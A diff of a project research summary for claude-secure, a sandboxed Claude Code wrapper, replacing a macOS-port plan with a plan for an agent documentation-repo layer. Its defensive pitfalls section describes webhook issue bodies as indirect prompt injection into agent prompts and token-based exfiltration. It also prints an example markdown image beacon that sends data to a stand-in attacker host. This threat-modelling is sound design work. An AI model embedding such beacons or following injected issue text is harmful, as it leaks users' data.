@@ -1,208 +1,177 @@
 # Project Research Summary
 
-**Project:** claude-secure v3.0 — macOS Support
-**Domain:** Cross-platform port of a Docker-based network-isolation security wrapper from Linux/WSL2 to macOS
+**Project:** claude-secure v4.0 Agent Documentation Layer
+**Domain:** Agent coordination infrastructure — bidirectional doc repo integration on top of a security-hardened, network-isolated Claude Code wrapper
 **Researched:** 2026-04-13
-**Confidence:** MEDIUM-HIGH
+**Confidence:** HIGH
 
 ## Executive Summary
 
-claude-secure v3.0 adds macOS as a supported platform. The existing four-layer security model (Docker isolation, PreToolUse hook validation, Node.js buffered proxy with secret redaction, Python+iptables call validator) does not need to be redesigned in principle — Docker Desktop provides a full Linux kernel VM where container-level iptables continues to work. However, two macOS-specific differences force meaningful changes: (1) the host service manager is launchd, not systemd, requiring new plist-based daemon definitions; and (2) macOS ships a badly outdated Bash 3.2 and BSD coreutils rather than GNU, which will silently break the approximately 2,300 lines of existing host-side Bash scripts.
+The v4.0 milestone turns the existing Phase 16 result channel (single-file report push) into a full documentation coordination layer. The doc repo becomes both an outbox (agents write structured reports, todo mutations, and architecture notes) and an inbox (webhook-dispatched tasks flow from doc-repo Issues into profile-scoped spawns). Research across all four dimensions confirms that approximately 70% of the required machinery already exists in Phases 12-17. The milestone is an extension, not a rebuild.
 
-The biggest unresolved question for this milestone is where network enforcement lives on macOS. The three research agents disagree in a way that cannot be resolved without testing on real hardware. The Stack agent argues iptables still works inside Docker Desktop's LinuxKit VM and pf is not needed. The Architecture agent argues iptables-in-container has a documented history of crashing Docker Desktop's network stack on macOS and enforcement must move to a host-side pfctl anchor driven by a launchd daemon. The Features agent, drawing from those same docker/for-mac issues, concludes the proxy chokepoint is the safer fallback. This conflict is the single biggest open question for v3.0 and must be resolved empirically before Phase C begins. Both possible outcomes (iptables-in-VM stays, or host-side pf replaces it) have clear implementation paths documented in the research.
+The recommended approach is conservative and additive: reuse the Phase 16 git-clone/commit/push harness for multi-file commits, extend the Phase 14/15 webhook listener with a new event routing rule for doc-repo pushes, add a Stop hook to enforce report writing, and extend profile.json with doc repo binding fields. No new containers, no new long-running services, no new host dependencies beyond bumping the git version check to 2.34. The only transport that satisfies atomicity and security requirements is `git push` over HTTPS with a fine-grained PAT held on the host, outside the Claude container.
 
-The macOS port is well-understood from an infrastructure standpoint: launchd plists, Homebrew dependency bootstrap, platform detection via uname -s, and the enforcement decision gate the rest. The macOS-specific pitfalls are numerous but well-documented and skew toward silent failure — the most dangerous mode for a security tool. Every macOS implementation phase must include active self-verification tests that fail loudly, not just pass/fail integration tests at the HTTP layer.
-
----
+The single highest-severity risk is architectural: the doc-repo write token must never enter the Claude container. All git operations must run in `bin/claude-secure` on the host (as Phase 16 already does), with the docs clone bind-mounted read-only into the container and agent-produced artifacts spool-filed to `/workspace/` for host-side pickup. Every other pitfall — Stop-hook loops, parallel push races, webhook prompt injection, markdown exfil beacons — has a well-defined prevention strategy and should be gated per phase. The security posture of v1.0 is preserved provided these constraints are enforced from the first design decision in each phase.
 
 ## Key Findings
 
-### Stack Additions for macOS
+### Recommended Stack
 
-The v1.0/v2.0 stack (Docker Compose, Node.js 22 stdlib proxy, Python 3.11 stdlib validator, SQLite, Bash hooks) carries forward unchanged inside containers. The macOS delta is entirely on the host side and in one container image change.
+No new technologies are added to the stack. The v4.0 stack is entirely the existing v1.0-v3.0 stack with two precision additions: `git 2.34+` sparse/partial clone flags (`--filter=blob:none --sparse`) and a GitHub fine-grained PAT scoped to a single repository. The `gh` CLI, REST/GraphQL client libraries, `libgit2`, `dulwich`, polling daemons, and a fourth Docker container were all evaluated and rejected. The decisive factor in all rejections is security surface: each addition introduces a new secret-handling path or supply-chain dependency in a tool whose core value is eliminating uncontrolled egress.
 
-**Core technologies added or changed:**
+**Core technologies (new or changed for v4.0):**
+- `git` CLI (2.34+): sparse + partial clone of docs repo — already installed, extend the Phase 16 clone pattern with `--filter=blob:none --sparse`
+- GitHub fine-grained PAT as `DOCS_REPO_TOKEN`: single-repo scoped credential, stored in profile `.env`, redacted automatically by Phase 3 proxy — preferred over classic PAT (full-repo access) and SSH deploy keys (key management surface)
+- `git push` over HTTPS with host-side PAT: atomic multi-file commits, 3-attempt jittered retry, never force-push — the only transport that supports atomicity; REST API (one file per call) and `gh` CLI (no atomic multi-file path) both rejected
 
-- **launchd (LaunchDaemon)**: Replaces systemd for all persistent host daemons. Webhook listener and (if pf path is chosen) the validator daemon both become `/Library/LaunchDaemons/` plists loaded via `launchctl bootstrap system`. Use `bootstrap`/`bootout` exclusively — `load`/`unload` are deprecated and unreliable across macOS versions. `KeepAlive` must be a dict (`Crashed=true, SuccessfulExit=false`) with `ThrottleInterval=10` to prevent crash-loop runaway. Plists must be root:wheel 0644 or launchd refuses to load them.
-- **Homebrew bash 5.x**: macOS ships `/bin/bash` 3.2.57 (2007, pre-GPLv3). `declare -A`, `mapfile`, `${var,,}`, `${var^^}`, `|&`, `&>>` all fail or silently misbehave on 3.2. Scripts must self-exec via a PATH-shimmed brew bash 5+ if `BASH_VERSINFO[0] < 4`. Shebang must be `#\!/usr/bin/env bash`, never `#\!/bin/bash`.
-- **Homebrew coreutils (GNU)**: BSD `date`, `sed -i`, `readlink -f`, `stat`, `xargs -r` all have incompatible flags that silently corrupt behavior. Recommended pattern: prepend `$(brew --prefix)/opt/coreutils/libexec/gnubin` to PATH at the top of every host script. Do not scatter `gdate`/`gsed` calls — the PATH-shim approach keeps scripts auditable.
-- **Validator base image switch**: `python:3.11-alpine` < 3.19 ships `iptables-legacy`; Docker Desktop Mac's LinuxKit VM uses the nftables backend. Mismatch causes `can't initialize iptables table 'filter': iptables who?` errors. Switch to `python:3.11-slim-bookworm` (Debian, uses iptables-nft by default). Alternatively pin Alpine 3.19+ with explicit nft-backed iptables install, but the 80MB size delta for slim-bookworm is acceptable for a dev tool.
-- **`host.docker.internal` for hook registration**: On Linux, hooks register call-IDs with the validator via `127.0.0.1:<port>`. On macOS, containers must use `host.docker.internal`. Parameterize as `VALIDATOR_HOST` env var set per platform.
-- **Docker Desktop floor**: Require version 4.44.3+ for CVE-2025-9074 fix. Add to `doctor` preflight.
-- **pf (packet filter) — deferred**: pf is deliberately not added unless the Phase C empirical test confirms iptables-in-container is unreliable on macOS. If added, it uses a dedicated anchor at `/Library/Application Support/claude-secure/` loaded by a one-shot launchd plist. Never modify `/etc/pf.conf` directly (SIP risk, macOS update overwrites it).
+**Unchanged:** Node 22 proxy, Python 3.11 validator, Docker Compose internal network, iptables, Bash hooks.
 
-### Features: macOS Delta
+### Expected Features
 
-The FEATURES.md file covers v2.0 headless agent mode research; the macOS-specific feature breakdown was provided as inline data:
+**Must have (table stakes):**
+- T5: Profile ↔ doc repo binding — `docs_repo`, `docs_branch`, `docs_project_dir`, `docs_mode` in profile.json; `DOCS_REPO_TOKEN` in `.env` — unblocks everything
+- T1: Standardized agent report template — fixed schema: goal, where worked, what changed, what failed, how to test, future findings
+- T2: Per-project doc repo structure — `projects/<name>/todo.md`, `architecture.md`, `vision.md`, `ideas.md`, `specs/`, `reports/YYYY/MM/`
+- T3: Mandatory last-step reporting via Stop hook — best-effort with local spool, async ship, never blocks Claude exit
+- T6: INDEX.md append — one-line entry per report, same Stop hook commit
+- T4: Bidirectional task flow via GitHub Issues — label `agent-task` → `resolve_profile_by_docs_repo` → `do_spawn`
 
-| Status | Count | Representative Examples |
-|--------|-------|------------------------|
-| IDENTICAL — no change on macOS | 17 | Proxy secret redaction, hook validation logic, Docker Compose internal networking, Claude Code invocation |
-| GUARD — platform branch required | 5 | Installer, uninstaller, webhook listener setup, firewall rule management, CLI PATH handling |
-| PORT — macOS-specific implementation | 3 | Service manager (launchd), network enforcement (iptables vs pf — open decision), host dependency bootstrap (Homebrew) |
-| REDESIGN — non-trivial architectural change | 2 | Validator placement (container vs host-side daemon), proxy placement (container vs host-side if pf path chosen) |
-| NOT AVAILABLE | 1 | `flock`-based file locking; substitute with `mkdir` atomicity |
+**Should have (differentiators):**
+- D1: Security-preserving report pipeline — report push traverses same redaction path as Anthropic traffic
+- D2: Scout findings feed back into todo.md — "Future Findings" bullets auto-appended as P3 items
 
-**Must-have (table stakes) for macOS launch:**
-- All four security layers must be active and verifiable on Docker Desktop 4.44.3+
-- Webhook listener must run on boot without a logged-in user (LaunchDaemon, not LaunchAgent)
-- Installer must complete successfully on both Apple Silicon and Intel Macs
-- Uninstaller must cleanly remove all daemons, anchors, and config without requiring manual steps
+**Defer to v4.1+:** per-profile template inheritance (D3), TASKS.md file-polling (T4b), interactive-mode reporting
 
-**Defer to v3.1:**
-- Host-level pf enforcement of the webhook listener's own egress (new feature, not a port)
-- Colima/OrbStack support as tested alternatives (document as "should work" only)
-- Automated macOS E2E CI if GitHub Actions macOS runner cost is prohibitive
+**Never ship:** live dashboards, agent-rewritable architecture/vision docs without gating, verbose per-tool-call entries, auto-close Issues, custom markdown DSL, cross-project search, agent-authored profile changes.
 
 ### Architecture Approach
 
-The macOS architecture diverges from Linux/WSL2 at exactly one point: the enforcement layer and the service manager. Everything inside Docker Compose (proxy, claude container, hook scripts) is unchanged. Everything above the Docker boundary (systemd to launchd, iptables-container-managed vs pf-host-managed) is platform-specific.
+All git operations run on the host in `bin/claude-secure`, not inside the Claude container. The docs clone is bind-mounted read-only into the container so agents can read vision.md and architecture.md as context. Agent-produced artifacts are written to `/workspace/` then read by the host-side `publish_docs_bundle` after Claude exits, redacted, and committed in a single atomic push.
 
-**The open architectural decision — must be resolved empirically in Phase C:**
+**Major components (new or modified):**
+1. `bin/claude-secure: fetch_docs_context` — startup shallow+sparse clone, read-only bind mount, prompt variables `{{VISION}}`, `{{ARCHITECTURE_SUMMARY}}`, `{{TODO_OPEN_ITEMS}}`
+2. `bin/claude-secure: publish_docs_bundle` — extends `publish_report` to accept N (path, body) pairs, single atomic commit, 3-attempt retry; D-15 redactor runs over every staged file unconditionally
+3. `bin/claude-secure: stage_docs_update` — reads `/workspace/.todo-patch.md` and `/workspace/.ideas-append.md`, validates, redacts, queues for bundle commit
+4. Stop hook — verifies local spool file exists (no network); host-side async shipper sends spooled reports with backoff; `stop_hook_active` guard prevents re-prompt loops
+5. `webhook/listener.py: resolve_profile_by_docs_repo` — routes `push` and `issues.labeled` events from doc repo to correct profile
+6. `webhook/docs-templates/` — `agent-report.md`, `docs-task.md`, `todo-append.md`
 
-| Option A: iptables stays in container | Option B: enforcement moves to host pf |
-|--------------------------------------|---------------------------------------|
-| Stack agent recommendation | Architecture and Features agent recommendation |
-| Lower implementation cost | Higher implementation cost |
-| Works if crashes are `--network=host`-specific | Required if NET_ADMIN + bridge networking also crashes |
-| Validator stays a container service | Validator becomes a launchd daemon; container removed from compose on macOS |
-| Proxy stays in container | Proxy likely moves to host as a launchd daemon |
-| pf not added | pf anchor at `/Library/Application Support/claude-secure/` |
-| Resolution: boot Docker Desktop, add NET_ADMIN + bridge, run iptables, observe for 30 min | Same test, watching for crashes |
-
-**Major components and macOS disposition:**
-
-1. **`claude` container** — UNCHANGED. Hook registration URL parameterized to `host.docker.internal` on macOS.
-2. **`proxy` container** — UNCHANGED (Option A). Moved to host launchd daemon (Option B, to enable uid-based pf filtering).
-3. **`validator` container** — UNCHANGED (Option A). Deleted from compose on macOS, replaced by host-side launchd daemon driving pfctl anchors (Option B).
-4. **`lib/platform.sh`** — NEW. Single sourced detection function returning `macos`/`wsl2`/`linux`. `CLAUDE_SECURE_PLATFORM_OVERRIDE` env var for CI mocking.
-5. **`com.claude-secure.webhook.plist`** — NEW. LaunchDaemon replacing the Linux systemd webhook unit.
-6. **`com.claude-secure.validator.plist`** — NEW, Option B only.
-7. **`com.claude-secure.pf-loader.plist`** — NEW, Option B only. One-shot RunAtLoad to restore pf anchor after reboot.
-8. **`installer.sh` / `uninstaller.sh`** — MODIFIED. Platform branches for all system-state operations.
+**Must-NOT-touch:** `proxy/server.js`, `validator/`, `hooks/pretooluse.sh`, `compose.yaml` network topology.
 
 ### Critical Pitfalls
 
-1. **Docker Desktop iptables silent bypass** — Validator starts successfully, NET_ADMIN is granted, but iptables rules silently fail to apply inside the LinuxKit VM, meaning all outbound calls pass through regardless of whitelist. This is the worst possible failure mode: security appears working but is not. Prevention: validator entrypoint must insert a test rule and verify it appears in `iptables -L`, failing loudly if not. Integration tests must assert TCP-level blocking (not just HTTP 403). Use native arm64 images on Apple Silicon — no Rosetta emulation for containers with NET_ADMIN.
+1. **Doc-repo token as egress channel (C-1)** — PAT in the Claude container makes git push an uncontrolled exfil path bypassing all four security layers. Prevention: PAT lives in host-only `.env`, never mounted into container; all git operations run on the host. Must be locked at Phase A — this is the single most dangerous architectural decision in v4.0.
 
-2. **pf zombie anchors on Ventura+** — `pfctl -a claude-secure -F all` flushes rules but leaves the anchor node in memory until reboot. Old blocking rules can linger after uninstall+reinstall in the same session. Prevention: installer detects stale anchors via `pfctl -sr -a claude-secure` and refuses to proceed; uninstaller warns reboot may be required; integration tests run from a fresh boot or VM snapshot.
+2. **Stop-hook loop on report failure (C-2)** — if Stop hook blocks on doc-repo network failure, Claude re-prompts indefinitely. Prevention: Stop hook only verifies local spool file (no network); async host-side shipper handles push with backoff; `stop_hook_active` guard is mandatory. Test: "doc repo DNS fails, assert Claude exits cleanly within 5 seconds."
 
-3. **Bash 3.2 silent misbehavior** — macOS `/bin/bash` is 3.2.57. `${var,,}` (lowercase expansion) returns the variable unchanged rather than erroring, causing domain matching to fail open — a security bypass that does not produce errors. Prevention: every host script version-checks `BASH_VERSINFO[0]` at entry and self-execs via Homebrew bash 5+ if below 4. CI must include a Bash 3.2 gate job. Audit all 2,300 existing lines for 4.0+ syntax.
+3. **Parallel push race on shared doc repo (C-3)** — N concurrent agents pushing to `main` produce non-fast-forward rejections; shared files produce merge conflicts. Prevention: per-session filenames under `reports/<project>/<YYYY-MM-DD>/<session-id>.md` eliminate report collisions; host-side write daemon serializes pushes with `flock`; agents never write shared files directly.
 
-4. **LaunchAgent vs LaunchDaemon** — If the webhook listener plist lands in `~/Library/LaunchAgents/` instead of `/Library/LaunchDaemons/`, the daemon dies at logout and GitHub webhook events are silently dropped. Prevention: always use `/Library/LaunchDaemons/`, root:wheel 0644, `launchctl bootstrap system`. Document explicitly why LaunchDaemon was chosen.
+4. **Webhook payload as indirect prompt injection (C-4)** — issue bodies from the doc repo flowing into agent prompts is textbook indirect prompt injection. Prevention: structured fields only (repo name, issue number, labels), never raw issue body in prompts; agents fetch issue body as data; Phase 15 sanitization pass reused unconditionally; profile-scoped `allowed_repos` allowlist.
 
-5. **BSD coreutils silent data corruption** — `sed -i 's/x/y/' file` on macOS creates a backup file named `s/x/y/` and leaves the original unmodified — no error, config updates silently do not apply. `date -d` errors at runtime. Prevention: PATH-shim GNU coreutils from Homebrew via `$(brew --prefix)/opt/coreutils/libexec/gnubin` at the top of every host script. CI must run integration tests on a macOS runner.
-
-6. **SIP blocks `/etc/pf.conf` edits** — Editing `/etc/pf.conf` may succeed on some macOS versions but is silently overwritten by OS updates. Prevention: never modify `/etc/pf.conf`. Use a dedicated anchor file at a non-SIP path, loaded by a one-shot launchd plist. Verify `csrutil status` remains enabled — SIP disabled is a blocking issue for a security tool.
-
----
+5. **Markdown exfil beacons in agent-authored reports (C-5)** — `![](https://attacker.tld/?data=...)` in committed reports is fetched by any markdown renderer. Prevention: `publish_docs_bundle` runs markdown sanitizer over every staged file (strip external image refs, HTML comments, raw HTML); fixed-schema report with typed fields and length caps.
 
 ## Implications for Roadmap
 
-### The Enforcement Decision Blocks Phase Ordering
+### Phase A: Profile Schema Extension + Back-Compat Aliases
+**Rationale:** Everything else depends on the profile knowing where to write. Zero behavior change — safe to land first.
+**Delivers:** `docs_repo`, `docs_branch`, `docs_project_dir`, `docs_mode` in profile.json; `DOCS_REPO_TOKEN` with `REPORT_REPO_TOKEN` fallback; deprecation warnings.
+**Addresses:** T5
+**Avoids:** M-1 (separate `.docs-repo-key` file with 0400 perms)
 
-The iptables-vs-pf question is not a design preference — it determines whether the validator stays in Docker Compose or moves to a host launchd daemon, which in turn determines whether the proxy moves, how many launchd plists exist, and what the pf anchor lifecycle looks like. Phase D cannot be planned until Phase C commits to an option.
+### Phase B: Multi-File Publish Bundle (Outbound Path)
+**Rationale:** Core deliverable. Immediately visible to users. Can proceed in parallel with Phase A.
+**Delivers:** `publish_docs_bundle` (multi-file atomic commit), `render_agent_report_bundle`, `agent-report.md` template, INDEX.md append, D-15 redactor on all staged files.
+**Addresses:** T1, T6, D1, D2 (scout findings section in template)
+**Avoids:** C-5 (markdown sanitizer in publish_docs_bundle), C-1 (PAT never in container), M-7 (redact all staged files)
 
-### Suggested Phase Order
+### Phase C: fetch_docs_context + Read-Only Bind Mount
+**Rationale:** Agents need project context before working. Depends on Phase A. Delivers the read half of the bidirectional loop.
+**Delivers:** `fetch_docs_context` startup clone, read-only bind mount at `/agent-docs/`, prompt template variables `{{VISION}}`, `{{ARCHITECTURE_SUMMARY}}`, `{{TODO_OPEN_ITEMS}}`; graceful skip when absent.
+**Avoids:** m-4 (no `.git` mount), M-2 (unix socket, not host.docker.internal)
 
-**Phase A: Platform Abstraction (Foundation)**
-**Rationale:** Every subsequent phase has a platform branch. Without `lib/platform.sh` and the installer skeleton, every file touched later will need duplicate edits. No behavior change on Linux/WSL2.
-**Delivers:** `lib/platform.sh` with `detect_platform()` and `detect_arch()`. `CLAUDE_SECURE_PLATFORM_OVERRIDE` for CI mocking. Installer/uninstaller macOS branches that stub with `die "macOS: not yet implemented"`. Per-platform dependency preflight (Homebrew check, brew install bash/coreutils/jq, Docker Desktop version check). Bash version check + self-exec shim. GNU coreutils PATH shim. `flock` usage audit of existing 2,300 lines.
-**Avoids:** Bash 3.2 silent misbehavior (version check installed here), BSD coreutils silent corruption (PATH shim installed here).
-**Research flag:** Standard patterns, no additional research needed.
+### Phase D: Stop Hook + Spool-Based Mandatory Reporting
+**Rationale:** Enforcement point. Depends on Phases B and C. Makes reporting guaranteed rather than optional.
+**Delivers:** Stop hook (local spool verification only, no network); host-side async shipper with jittered backoff; `stage_docs_update` for todo/ideas patch artifacts; `stop_hook_active` guard; failure-mode spec.
+**Addresses:** T3
+**Avoids:** C-2 (hook never touches network), M-4 (spool size cap + LRU), m-3 (log SHA only)
+**Research flag:** Stop hook API field names — re-verify with Context7 at plan time.
 
-**Phase B: Docker Desktop Compose Compatibility**
-**Rationale:** Must confirm the `claude` container boots and the existing security layers function under Docker Desktop before investing in enforcement changes. If something is fundamentally broken here, it changes the scope of all later phases.
-**Delivers:** Verified `docker-compose.yml` boots on Docker Desktop. Hook registration URL parameterized (`VALIDATOR_HOST` env var). Validator base image switched to `python:3.11-slim-bookworm`. Compose profile gate so the `validator` service can be conditionally excluded on macOS if Phase C chooses Option B. Smoke test: claude container boots, proxy reachable, hook fires, call-ID registered.
-**Avoids:** Alpine iptables-legacy incompatibility (image switch), `--network=host` anti-pattern (documented prohibition), host-to-container networking pitfall (published ports only, not bridge IP).
-**Research flag:** Needs Docker Desktop smoke test on real macOS hardware to confirm `internal: true` DNS and shared network namespace work correctly. Docker/for-mac #7262 (internal bridge DNS) may require `dns:` workaround.
+### Phase E: Webhook Inbound Path (Doc Repo → Agent)
+**Rationale:** Completes the bidirectional loop. Depends on Phase D (outbound must be proven first). Highest-complexity phase.
+**Delivers:** `resolve_profile_by_docs_repo`, `docs-inbox`/`docs-todo` event types, path-based filter, `docs-task.md` prompt template, HMAC timing-safe comparison audit, profile-scoped repo allowlist.
+**Addresses:** T4
+**Avoids:** C-4 (structured fields only), M-5 (timing-safe HMAC), M-6 (no URLs from payload)
+**Research flag:** Needs `/gsd:research-phase` — `docs-inbox` event-type filter against real GitHub push payload shapes is a new design not yet validated.
 
-**Phase C: Enforcement Decision + Implementation (Highest Risk)**
-**Rationale:** This is the open question. Phase C begins with an explicit spike: boot Docker Desktop on macOS, run the validator container with `NET_ADMIN` + bridge network (no `--network=host`), attempt to add and verify iptables OUTPUT rules, observe whether Docker Desktop's network stack remains stable. If stable: take Option A (iptables stays). If rules fail or Docker Desktop crashes: take Option B (host pf).
-**Delivers (Option A):** Validator entrypoint self-test (rule insert + verify, fail loud if absent). Integration test asserting TCP-level block. Native arm64 container images confirmed.
-**Delivers (Option B):** `validator.py` ported as host process with pfctl anchor driver (rewrite-whole-anchor pattern). pf base anchor file at `/Library/Application Support/claude-secure/`. Proxy either moved to host or host-side tunnel established. `docker-compose.yml` on macOS omits validator service. Host validator HTTP server reachable via `host.docker.internal` from containers.
-**Avoids:** iptables silent bypass pitfall, pf zombie anchor pitfall (Option B), SIP pitfall (Option B).
-**Research flag:** REQUIRES empirical verification on macOS hardware before implementation begins. This is the only phase that cannot be fully planned from research alone. Budget 90 minutes for the spike as Phase C task 0.
-
-**Phase D: launchd Lifecycle**
-**Rationale:** Phase C defines which host daemons exist. Phase D writes and installs the plists. Mechanical work with well-documented patterns — safe to execute quickly once Phase C commits to an option.
-**Delivers:** `com.claude-secure.webhook.plist` (LaunchDaemon, always). `com.claude-secure.validator.plist` and `com.claude-secure.pf-loader.plist` (Option B only). Installer: `launchctl bootstrap system`, `launchctl enable system/<label>`, `launchctl kickstart -k`. Uninstaller: `launchctl bootout system/<label>`, plist removal, pf anchor cleanup with reboot warning. Explicit PATH in every plist EnvironmentVariables block.
-**Avoids:** LaunchAgent vs LaunchDaemon pitfall, deprecated `launchctl load` pitfall, PATH-in-daemon pitfall, keychain vs file pitfall (root-readable `/etc/claude-secure/` files only, no System Keychain).
-**Research flag:** Standard patterns, no additional research needed.
-
-**Phase E: Tests and Hardening**
-**Rationale:** macOS failure modes are disproportionately silent. Every feature needs active verification, not just a "did it run" check. This phase closes the CI gap — Linux-only CI is insufficient for a multi-platform tool.
-**Delivers:** Mock-based tests of macOS code paths runnable on Linux CI via `CLAUDE_SECURE_PLATFORM_OVERRIDE=macos`. Negative integration tests asserting TCP-level block on non-whitelisted domains. pf anchor state verification after install and after uninstall (zombie anchor check). Uninstall-reinstall idempotency test. Bash 3.2 compatibility gate CI job. Docker Desktop smoke test on real macOS hardware or macOS GitHub Actions runner.
-**Avoids:** All silent failure pitfalls by enforcing "every macOS code path has an active self-verification test" as a blocking quality gate.
-**Research flag:** GitHub Actions macOS runner cost (`macos-14`/`macos-15`) should be evaluated before committing to automated E2E CI. Consider manual macOS testing for v3.0 with automated tests deferred to v3.1 if cost is prohibitive.
+### Phase F: Integration Tests + Operational Hardening
+**Rationale:** All functional phases complete; harden before v4.0 ship.
+**Delivers:** Roundtrip integration test (seed inbox → HMAC POST → assert docs commit delta); N=4 parallel-agent push test; M-3 token expiry warning; `claude-secure profile init-docs` bootstrap subcommand; report path migration documentation; back-compat test for Phase 16 profiles.
+**Addresses:** C-3 (parallel push test gates serialization strategy), M-3, M-4
 
 ### Phase Ordering Rationale
 
-- A before everything: platform detection is load-bearing scaffolding. Without it, every subsequent file needs duplicate edits.
-- B before C: confirms the base case works before investing in the hardest problem. A Docker Desktop incompatibility discovered in B could reframe C's scope.
-- C before D: launchd plists are hollow until the enforcement decision determines which daemons exist.
-- D before E (lifecycle tests): cannot test uninstall until install exists. Mock-based E tests can run in parallel with D.
-- The proxy-relocation decision (Option B only) happens in C and is the highest-risk sub-decision within that phase.
+- A before C: profile schema must exist before fetch_docs_context knows which `docs_project_dir` to clone.
+- B before D: publish_docs_bundle must exist before the Stop hook can call it.
+- C before D: bind mount and prompt variables are preconditions for context-aware reports.
+- D before E: outbound path must be proven before accepting inbound tasks that trigger outbound writes.
+- A and B in parallel: neither depends on the other.
+- F last: integration tests cannot validate what isn't built.
 
 ### Research Flags
 
-Needs empirical verification before planning commits:
-- **Phase C:** The iptables-vs-pf enforcement question is the only unresolved architectural issue. 90 minutes on macOS hardware resolves it. Do not plan Phase C implementation in detail until the spike result is known.
-- **Phase B:** Docker Desktop `internal: true` DNS has a known bug (docker/for-mac #7262). Needs smoke test during Phase B.
+Phases needing `/gsd:research-phase`:
+- **Phase D:** Stop hook `stop_hook_active` field semantics and re-prompt trigger conditions — version-sensitive, re-verify with Context7 at plan time.
+- **Phase E:** `docs-inbox`/`docs-todo` event-type filter tuning against real GitHub push payload shapes — validate before writing listener code.
 
-Standard patterns, no additional research needed:
-- **Phase A:** `uname -s` detection, Homebrew install, launchd/systemd mapping — all fully documented in STACK.md and ARCHITECTURE.md.
-- **Phase D:** launchd LaunchDaemon patterns are stable since macOS 10.4. All plist keys needed are covered in research.
-- **Phase E:** Testing patterns follow from Phase C decisions.
-
----
+Phases with standard patterns (skip research-phase):
+- **Phase A:** profile.json schema extension follows existing Phase 12 patterns.
+- **Phase B:** multi-file git commit is a direct extension of proven Phase 16 harness.
+- **Phase C:** git sparse-checkout flags are documented and stable.
+- **Phase F:** test scaffolding follows Phase 16/17 shell-script pattern.
 
 ## Confidence Assessment
 
 | Area | Confidence | Notes |
 |------|------------|-------|
-| Stack (launchd, Homebrew, image switch) | HIGH | Stable Apple APIs and Docker documentation. Validator image switch has strong rationale from multiple sources. |
-| Features (macOS delta) | MEDIUM | Based on inline data, not a full FEATURES.md for v3.0. The 17/5/3/2/1 breakdown is directionally correct but not empirically verified per-feature. |
-| Architecture (component topology) | MEDIUM-HIGH | launchd and pf mechanics are HIGH confidence. The enforcement decision itself is MEDIUM until empirical test resolves it. |
-| Pitfalls | HIGH | All major pitfalls are well-sourced (Apple Developer Forums, docker/for-mac issues, official Apple docs). The "silent failure" theme is consistent and actionable. |
+| Stack | HIGH | All decisions reuse proven Phase 16 transport; alternatives rejected with specific documented reasons; fine-grained PAT is GitHub's own recommendation since 2023 |
+| Features | HIGH | T1-T6 sourced from multiple independent converging specs (TASKS.md, Claude Code hooks reference, GitHub Agentic Workflows, HANDOFF.md pattern); anti-features grounded in architecture constraints |
+| Architecture | HIGH | Based on direct code inspection of shipped Phase 12-17 source (line numbers cited); only inbound webhook filter tuning is new design (MEDIUM for that section) |
+| Pitfalls | HIGH | C-1 is first-principles from v1.0 threat model; C-2 is documented Claude Code behavior; C-3 is standard distributed-git race; C-4/C-5 have canonical CVE-level case studies. MEDIUM only on exact Stop hook API fields at implementation time. |
 
-**Overall confidence:** MEDIUM-HIGH
+**Overall confidence:** HIGH
 
-### Gaps to Address
+## Gaps to Address
 
-- **Enforcement architecture open question**: Cannot be resolved by research alone. Must be scheduled as the explicit first task of Phase C. A 90-minute test on macOS hardware resolves it definitively.
-- **`user <uid>` pf filtering on Darwin pf**: macOS pf is forked from OpenBSD 4.6 (2009). Whether `user <uid>` egress filtering is available in the Darwin fork needs a `pfctl -nf` test. If unsupported, enforcement uses port-based filtering instead. Affects pf anchor template design in Option B.
-- **`flock` usage audit**: STACK.md flags `flock` as unavailable on macOS. The existing scripts need to be audited for `flock` usage before Phase A completes. Substitute with `mkdir`-based atomicity.
-- **Bash 4+ syntax audit**: 2,300 lines of existing scripts need scanning for `declare -A`, `mapfile`, `readarray`, `${var,,}`, `${var^^}`, `|&`, `&>>`. Mechanical task, belongs in Phase A.
-- **Docker Desktop `internal: true` DNS**: docker/for-mac #7262 documents DNS failures on internal bridge networks. Needs smoke test in Phase B; may require explicit `dns:` config in docker-compose.yml on macOS.
-
----
+- **Stop hook API version:** Re-verify `stop_hook_active` field name and re-prompt semantics with Context7 during Phase D planning.
+- **Webhook filter tuning:** Validate `payload.commits[].added/modified` path filter against a real GitHub push payload before Phase E implementation.
+- **todo.md line-anchor format:** GFM task list with `<!-- id:abc123 -->` vs YAML frontmatter — needs a decision before Phase D ships `stage_docs_update`. Recommendation: GFM with comment anchor.
+- **Docs repo bootstrapping UX:** Stub in Phase C (create dirs on first clone if absent) vs full subcommand in Phase F — lock at roadmap time.
+- **Report path migration:** Old flat `reports/YYYY/MM/` vs new `projects/<name>/reports/` — lock before Phase B writes any new reports. Recommendation: new reports go under project dir; document the cutover in v4.0 release notes.
 
 ## Sources
 
-### Primary (HIGH confidence — official docs or Apple-maintained)
-- Apple Developer Forums thread/745158: pfctl zombie anchors on Ventura+
-- Apple Developer Docs: SIP scope and protected paths
-- launchd.plist(5) man page: RunAtLoad, KeepAlive, EnvironmentVariables keys
-- launchctl man page (ss64): bootstrap/bootout semantics, domain targets
-- docker/for-mac #6297 and #2489: iptables in containers on macOS, LinuxKit VM crashes
-- Docker Blog: How Docker Desktop Networking Works Under the Hood (vpnkit, VM boundary)
-- Docker Docs: Networking on Docker Desktop, Mac permission requirements
+### Primary (HIGH confidence)
+- `.planning/phases/16-result-channel/16-CONTEXT.md` — D-01 through D-18 locked decisions; canonical Phase 16 transport reference
+- `.planning/phases/14-webhook-listener/14-CONTEXT.md` — inbound webhook substrate
+- `.planning/phases/15-event-handlers/15-CONTEXT.md` — template fallback chain + payload sanitization
+- `bin/claude-secure` (direct code inspection, lines 343-1424) — publish_report, audit writer, do_spawn
+- `webhook/listener.py` (direct code inspection, lines 44-535) — event type, filter, profile resolver
+- GitHub fine-grained PAT docs (official) — scoping, 366-day expiry, per-repo permissions
+- git-sparse-checkout documentation (official) — `--filter=blob:none --sparse`, stable since git 2.25
+- Claude Code hooks reference — Stop hook semantics, `stop_hook_active`
+- TASKS.md spec (tasksmd.github.io) — per-project doc layout, Scout pattern, GFM task format
 
-### Secondary (MEDIUM confidence — community, multiple sources agree)
-- Neil Sabol: pf on macOS — anchor-based approach, LaunchDaemon pattern
-- launchd.info: LaunchDaemon vs LaunchAgent distinction
-- Medium: Docker Desktop crash on macOS via host network + iptables
-- OpenBSD PF Anchors: dynamic rule rewrite pattern (extrapolated to Darwin pf fork)
-- HackMD: BSD vs GNU vs Busybox utility differences
-- safjan.com and megamorf: bash detect Linux/macOS via uname -s
+### Secondary (MEDIUM confidence)
